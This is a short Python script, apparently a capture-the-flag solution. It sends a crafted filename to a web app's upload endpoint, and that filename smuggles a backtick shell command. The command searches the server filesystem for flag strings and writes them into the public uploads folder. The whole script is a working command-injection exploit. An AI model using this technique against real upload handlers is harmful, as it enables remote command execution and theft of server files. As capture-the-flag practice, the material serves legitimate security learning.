from sys import argv
from requests import post

url_index, img_path = argv[1:3]
url_upload = f"{url_index}/upload"

sys_dirs = ("bin", "dev", "lib64", "opt", "root", "sbin", "sys", "usr", "boot", "etc", "lib", "mnt", "proc", "run", "srv", "tmp", "var")
exclude = "".join(f"--exclude-dir={dir}" for dir in sys_dirs)
injection = fr"""`grep -rsiPo "flag{{\K.*?(?=}})" / {exclude} > uploads/flag.txt`.png"""

post(url_upload, files={"file": (injection, open("/dev/null"))})
